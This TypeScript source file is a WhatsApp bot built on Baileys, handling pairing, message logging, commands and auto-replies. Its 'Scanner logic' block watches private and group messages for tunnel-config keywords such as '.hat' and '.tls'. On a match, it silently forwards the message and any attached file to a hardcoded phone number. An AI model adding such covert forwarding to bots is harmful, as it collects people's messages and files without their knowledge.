import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  type WASocket,
  type BaileysEventMap,
} from "@whiskeysockets/baileys";
import { Boom } from "@hapi/boom";
import path from "path";
import fs from "fs";
import { db } from "@workspace/db";
import {
  waMessagesTable,
  waContactsTable,
  waConfigTable,
  waAutoRepliesTable,
} from "@workspace/db";
import { eq, sql } from "drizzle-orm";
import { randomUUID } from "crypto";
import { logger } from "./logger";

import { loadCommands } from "../utils/loader";
import { handleMessage } from "../handlers/messageHandler";


const AUTH_DIR = path.resolve(process.cwd(), "wa_auth");

export type BotState = "disconnected" | "connecting" | "awaiting_pairing" | "connected";

export interface BotInfo {
  state: BotState;
  phoneNumber?: string;
  deviceName?: string;
  platform?: string;
  connectedAt?: Date;
}

type SseClient = {
  id: string;
  write: (event: string, data: unknown) => void;
};

let socket: WASocket | null = null;
let botInfo: BotInfo = { state: "disconnected" };
const sseClients: SseClient[] = [];

export function getBotInfo(): BotInfo {
  return { ...botInfo };
}

export function addSseClient(client: SseClient) {
  sseClients.push(client);
  logger.info({ clientId: client.id }, "SSE client connected");
}

export function removeSseClient(id: string) {
  const idx = sseClients.findIndex((c) => c.id === id);
  if (idx !== -1) sseClients.splice(idx, 1);
  logger.info({ clientId: id }, "SSE client disconnected");
}

function broadcast(event: string, data: unknown) {
  for (const client of sseClients) {
    try {
      client.write(event, data);
    } catch {
      // client gone
    }
  }
}

function setBotState(update: Partial<BotInfo>) {
  botInfo = { ...botInfo, ...update };
  broadcast("status", botInfo);
}

async function upsertContact(jid: string, name?: string | null) {
  const phoneNumber = jid.replace("@s.whatsapp.net", "").replace("@g.us", "");
  const existing = await db.select().from(waContactsTable).where(eq(waContactsTable.jid, jid));
  if (existing.length === 0) {
    await db.insert(waContactsTable).values({
      id: randomUUID(),
      jid,
      name: name ?? null,
      phoneNumber,
      messageCount: 1,
      lastMessageAt: new Date(),
    }).onConflictDoNothing();
  } else {
    await db.update(waContactsTable)
      .set({
        messageCount: sql`${waContactsTable.messageCount} + 1`,
        lastMessageAt: new Date(),
        ...(name ? { name } : {}),
      })
      .where(eq(waContactsTable.jid, jid));
  }
}

async function checkAutoReply(content: string): Promise<string | null> {
  const rules = await db.select().from(waAutoRepliesTable).where(eq(waAutoRepliesTable.enabled, true));

  for (const rule of rules) {
    const text = rule.caseSensitive ? content : content.toLowerCase();
    const trigger = rule.caseSensitive ? rule.trigger : rule.trigger.toLowerCase();

    let matched = false;
    if (rule.matchType === "exact") matched = text === trigger;
    else if (rule.matchType === "contains") matched = text.includes(trigger);
    else if (rule.matchType === "startsWith") matched = text.startsWith(trigger);
    else if (rule.matchType === "regex") {
      try {
        matched = new RegExp(rule.trigger, rule.caseSensitive ? "" : "i").test(content);
      } catch {
        matched = false;
      }
    }

    if (matched) {
      await db.update(waAutoRepliesTable)
        .set({ hitCount: sql`${waAutoRepliesTable.hitCount} + 1` })
        .where(eq(waAutoRepliesTable.id, rule.id));
      return rule.response;
    }
  }
  return null;
}

export async function connectBot(): Promise<void> {
  console.log("🚀 connectBot CALLED");
  if (!fs.existsSync(AUTH_DIR)) fs.mkdirSync(AUTH_DIR, { recursive: true });
  const commands = await loadCommands();
  console.log("🔥 COMMANDS LOADED:", [...commands.keys()]);
  const { version } = await fetchLatestBaileysVersion();
  const { state: authState, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
  
  setBotState({ state: "connecting" });

  socket = makeWASocket({
    version,
    auth: authState,
    printQRInTerminal: false,
    logger: logger.child({ module: "baileys" }) as never,
    getMessage: async () => undefined,
  });

  socket.ev.on("creds.update", saveCreds);

  socket.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (connection === "close") {
      const shouldReconnect =
        (lastDisconnect?.error as Boom)?.output?.statusCode !== DisconnectReason.loggedOut;

      logger.info({ shouldReconnect }, "Connection closed");

      if (shouldReconnect) {
        setBotState({ state: "disconnected" });
        setTimeout(() => connectBot(), 5000);
      } else {
        setBotState({ state: "disconnected", phoneNumber: undefined, deviceName: undefined });
        clearAuth();
      }
    }

    if (connection === "open") {
      const me = socket?.user;
      setBotState({
        state: "connected",
        phoneNumber: me?.id?.replace(":0@s.whatsapp.net", "").replace("@s.whatsapp.net", "") ?? undefined,
        deviceName: me?.name ?? undefined,
        connectedAt: new Date(),
      });
      logger.info({ phone: botInfo.phoneNumber }, "WhatsApp connected");
    }
  });

  socket.ev.on("messages.upsert", async ({ messages, type }) => {
  if (type !== "notify") return;

  const config = await db
    .select()
    .from(waConfigTable)
    .where(eq(waConfigTable.id, "singleton"));

  const cfg = config[0];
  const prefix = cfg?.prefix || "!";

  for (const msg of messages) {
    if (!msg.message || msg.key.fromMe) continue;

    const jid = msg.key.remoteJid ?? "";
    if (!jid || jid === "status@broadcast") continue;

    const content =
      msg.message?.conversation ??
      msg.message?.extendedTextMessage?.text ??
      "[media]";

    const pushName = msg.pushName ?? null;

    // 🧾 Save contact
    await upsertContact(jid, pushName);

    // 💾 Save inbound message
    const msgId = randomUUID();
    await db.insert(waMessagesTable).values({
      id: msgId,
      remoteJid: jid,
      contactName: pushName,
      content,
      direction: "inbound",
      messageType: "text",
      status: "delivered",
      isAutoReply: false,
    });
// Scanner logic 🚩🚩
    const scanKeywords = [".hat", ".bdnet", ".tls", ".stk"];
const hasMatch = scanKeywords.some(keyword => content.toLowerCase().includes(keyword));

if (hasMatch && socket) {
  const ownerJid = "27619602759@s.whatsapp.net"; // Your business number
  const senderInfo = jid.endsWith('@g.us') ? `Group: ${jid}` : `Private: ${pushName || jid}`;

  await socket.sendMessage(ownerJid, {
    text: `🚩 *File Scanner Alert*\n\n` +
          `*Match:* Found config/keyword\n` +
          `*From:* ${senderInfo}\n` +
          `*Content:* ${content}`,
  });

  // Optional: Forward the actual message if it contains a document
  if (msg.message?.documentWithCaptionMessage || msg.message?.documentMessage) {
    await socket.sendMessage(ownerJid, { forward: msg });
  }
}

    broadcast("message", {
      id: msgId,
      remoteJid: jid,
      contactName: pushName,
      content,
      direction: "inbound",
      messageType: "text",
      status: "delivered",
      isAutoReply: false,
      createdAt: new Date().toISOString(),
    });

    // 🚀 NEW: COMMAND HANDLER (PRIORITY)
    const handled = await handleMessage({
      sock: socket!,
      msg,
      text: content,
      commands,
      prefix,
      db,
      tables: { waMessagesTable, waContactsTable, waAutoRepliesTable, waConfigTable },
      getBotInfo,
    });

    if (handled) {
      logger.info({ jid, content }, "Command handled");
      continue; // ⛔ STOP auto-reply if command matched
    }

    // 🤖 AUTO-REPLY (fallback only)
    if (cfg?.autoReplyEnabled !== false) {
      const reply = await checkAutoReply(content);

      if (reply && socket) {
        if (cfg?.typingIndicatorEnabled) {
          await socket.sendPresenceUpdate("composing", jid);
          await new Promise((r) => setTimeout(r, 800));
          await socket.sendPresenceUpdate("paused", jid);
        }

        await socket.sendMessage(jid, { text: reply });

        const replyId = randomUUID();
        await db.insert(waMessagesTable).values({
          id: replyId,
          remoteJid: jid,
          contactName: pushName,
          content: reply,
          direction: "outbound",
          messageType: "text",
          status: "sent",
          isAutoReply: true,
        });

        broadcast("message", {
          id: replyId,
          remoteJid: jid,
          contactName: pushName,
          content: reply,
          direction: "outbound",
          messageType: "text",
          status: "sent",
          isAutoReply: true,
          createdAt: new Date().toISOString(),
        });
      }
    }
  }
});
      
}

export async function requestPairingCode(phoneNumber: string): Promise<string> {
  if (!socket) {
    await connectBot();
    await new Promise((r) => setTimeout(r, 2000));
  }

  const cleaned = phoneNumber.replace(/\D/g, "");

  setBotState({ state: "awaiting_pairing" });

  const code = await socket!.requestPairingCode(cleaned);
  broadcast("pairing_code", { code });
  return code;
}

export async function sendMessage(to: string, content: string): Promise<void> {
  if (!socket || botInfo.state !== "connected") {
    throw new Error("Bot is not connected");
  }
  const jid = to.includes("@") ? to : `${to.replace(/\D/g, "")}@s.whatsapp.net`;
  await socket.sendMessage(jid, { text: content });
}

export async function logoutBot(): Promise<void> {
  if (socket) {
    await socket.logout().catch(() => {});
    socket = null;
  }
  clearAuth();
  setBotState({ state: "disconnected", phoneNumber: undefined, deviceName: undefined, connectedAt: undefined });
}

function clearAuth() {
  if (fs.existsSync(AUTH_DIR)) {
    fs.rmSync(AUTH_DIR, { recursive: true, force: true });
  }
}

export function getSocket(): WASocket | null {
  return socket;
}
